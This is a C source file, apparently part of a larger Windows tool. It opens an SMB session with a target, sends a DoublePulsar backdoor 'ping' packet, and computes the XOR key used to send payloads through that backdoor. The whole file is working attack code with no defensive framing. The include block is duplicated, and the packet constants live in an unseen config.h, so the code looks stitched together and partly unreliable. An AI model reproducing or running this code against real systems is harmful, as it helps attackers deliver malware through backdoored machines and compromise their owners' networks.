#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "config.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <errno.h>
#include <ctype.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif
#define sock_close(fd) closesocket((SOCKET)(fd))

extern int smb_connect(const char *ip, int port);
static int send_all(int fd, const void *data, size_t length)
{
    const unsigned char *bytes = data;
    size_t sent = 0;
    while (sent < length) {
        ssize_t n = send(fd, bytes + sent, length - sent, MSG_NOSIGNAL);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        sent += (size_t)n;
    }
    return 0;
}
static int recv_all(int fd, void *data, size_t length)
{
    unsigned char *bytes = data;
    size_t received = 0;
    while (received < length) {
        ssize_t n = recv(fd, bytes + received, length - received, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        received += (size_t)n;
    }
    return 0;
}
static int read_smb_frame(int fd, unsigned char **frame, size_t *frame_length)
{
    unsigned char header[4];
    uint32_t payload_length;
    unsigned char *buffer;
    if (recv_all(fd, header, sizeof(header)) < 0)
        return -1;
    payload_length = ((uint32_t)header[1] << 16) |
                     ((uint32_t)header[2] << 8) |
                     (uint32_t)header[3];
    buffer = malloc(sizeof(header) + (size_t)payload_length);
    if (buffer == NULL)
        return -1;
    for (size_t i = 0; i < sizeof(header); ++i)
        buffer[i] = header[i];
    if (payload_length != 0 &&
        recv_all(fd, buffer + sizeof(header), (size_t)payload_length) < 0) {
        free(buffer);
        return -1;
    }
    *frame = buffer;
    *frame_length = sizeof(header) + (size_t)payload_length;
    return 0;
}
unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    int fd = smb_connect(ip, port);
    unsigned char tc[sizeof(SMB_TREE_CONNECT_PKT)];
    unsigned char dp[sizeof(DP_PING_PKT)];
    unsigned char *resp = NULL;
    size_t rl = 0;
    unsigned char uid[2] = {0, 0};
    unsigned char tid[2] = {0, 0};
    uint32_t sig = 0;
    unsigned int key = 0;
    if (fd < 0)
        return 0;
    if (send_all(fd, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1) < 0)
        goto done;
    if (read_smb_frame(fd, &resp, &rl) < 0)
        goto done;
    free(resp);
    resp = NULL;
    if (send_all(fd, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT) - 1) < 0)
        goto done;
    if (read_smb_frame(fd, &resp, &rl) < 0)
        goto done;
    if (rl >= 34) {
        uid[0] = resp[32];
        uid[1] = resp[33];
    }
    free(resp);
    resp = NULL;
    memcpy(tc, SMB_TREE_CONNECT_PKT, sizeof(tc));
    tc[32] = uid[0];
    tc[33] = uid[1];
    if (send_all(fd, tc, sizeof(tc) - 1) < 0)
        goto done;
    if (read_smb_frame(fd, &resp, &rl) < 0)
        goto done;
    if (rl >= 30) {
        tid[0] = resp[28];
        tid[1] = resp[29];
    }
    free(resp);
    resp = NULL;
    memcpy(dp, DP_PING_PKT, sizeof(dp));
    dp[28] = tid[0];
    dp[29] = tid[1];
    dp[32] = uid[0];
    dp[33] = uid[1];
    if (send_all(fd, dp, sizeof(dp) - 1) < 0)
        goto done;
    if (read_smb_frame(fd, &resp, &rl) < 0)
        goto done;
    if (rl >= (size_t)SMB_RESP_SIGNATURE_END) {
        sig = (uint32_t)resp[SMB_RESP_SIGNATURE_START] |
              ((uint32_t)resp[SMB_RESP_SIGNATURE_START + 1] << 8) |
              ((uint32_t)resp[SMB_RESP_SIGNATURE_START + 2] << 16) |
              ((uint32_t)resp[SMB_RESP_SIGNATURE_START + 3] << 24);
        key = 2u * sig ^ ((((sig >> 16) | (sig & 0x00FF0000u)) >> 8) |
                          (((sig << 16) | (sig & 0x0000FF00u)) << 8));
        printf("DoublePulsarXORKeyCalculator: sig=0x%08x key=0x%08x\n", sig, key);
    }
done:
    if (resp != NULL)
        free(resp);
    sock_close(fd);
    return key;
}
